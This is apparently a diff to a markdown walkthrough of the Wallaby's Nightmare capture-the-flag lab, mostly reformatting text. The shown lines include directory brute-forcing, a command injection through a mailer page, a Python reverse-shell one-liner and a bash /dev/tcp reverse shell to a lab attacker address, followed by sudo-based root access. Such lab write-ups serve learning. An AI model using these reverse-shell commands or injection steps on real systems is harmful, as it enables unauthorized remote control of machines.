@@ -205,8 +205,8 @@ Content-Type: text/html; charset=UTF-8
     <img src="/sec.png"/></p>
 ```
 
-There’s a javascript form `POST` defined in that page.
-here’s a stub for a POST request that might be modified 
+There’s a javascript form POST defined in that page.  
+Here’s a stub for a POST request that might be modified 
 ```http
 POST / HTTP/1.1
 Host: 192.168.86.142:60080
@@ -220,12 +220,20 @@ name=value&name=value
 
 ***
 ### Dirbuster
-target url <http://192.168.86.142:60080>
-autoswitch (HEAD and GET)
-List Brute force using `/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt$
-URL to fuzz - /index.php?page={dir}`
+options:
+```
+target url <http://192.168.86.142:60080>  
 
-In one of the responses, a command injection can be found:
+autoswitch (HEAD and GET)  
+
+List Brute force using
+
+/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt$
+
+URL to fuzz - /index.php?page={dir}`
+```
+
+In one of the responses, a command injection can be found:  
 the mailer page has a mail function that performs an os command.
 `mail` is the command shown below, with the arguments being the user to mail, and the message,
 but any command on the system can be substituted...
@@ -253,6 +261,9 @@ combine these two lines --
 http://192.168.86.140:60080/?page=mailer&mail=
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.141",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+Now we have shell
+
 check what we can do with `sudo`
 ```
 $ sudo -l
@@ -377,7 +388,7 @@ from here, run another reverse shell, this will run as the ircbot process owner 
 ```
 .run bash -c “bash -i >& /dev/tcp/192.168.86.141/8080 0>&1"
 ```
-I needed help from abatchy’s writeup to get this syntax <http://www.abatchy.com/2017/01/wallabys-nightmare-walkthrough-vulnhub.html>
+I used help from abatchy’s writeup to get this syntax <http://www.abatchy.com/2017/01/wallabys-nightmare-walkthrough-vulnhub.html>
 
 as waldo, `sudo -l` finds that you effectively have root.
 grab the flag from /root directory and done
